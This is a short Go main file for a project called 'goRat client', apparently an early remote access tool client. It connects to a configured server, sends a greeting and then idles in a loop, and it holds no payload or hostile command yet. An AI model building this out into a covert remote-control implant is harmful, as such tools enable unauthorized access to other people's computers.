package main

import (
	"fmt"
	"time"

	"github.com/viher3/gorat-client/config"
	"github.com/viher3/gorat-client/network/socket"
)

func main() {
	conf := config.NewConfig()
	fmt.Println("############################")
	fmt.Println("### goRat client v"+conf.Version, "###")
	fmt.Println("############################")

	conn, err := socket.ConnectToServer(conf)

	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return
	}

	socket.SendMessage(conn, "Hello world!")
	//socket.CloseConnection(conn)

	for {
		timeToWait := 10
		fmt.Println("Waiting " + fmt.Sprint(timeToWait) + " seconds before cheking incomming messages ...")
		time.Sleep(time.Duration(timeToWait) * time.Second)
	}
}
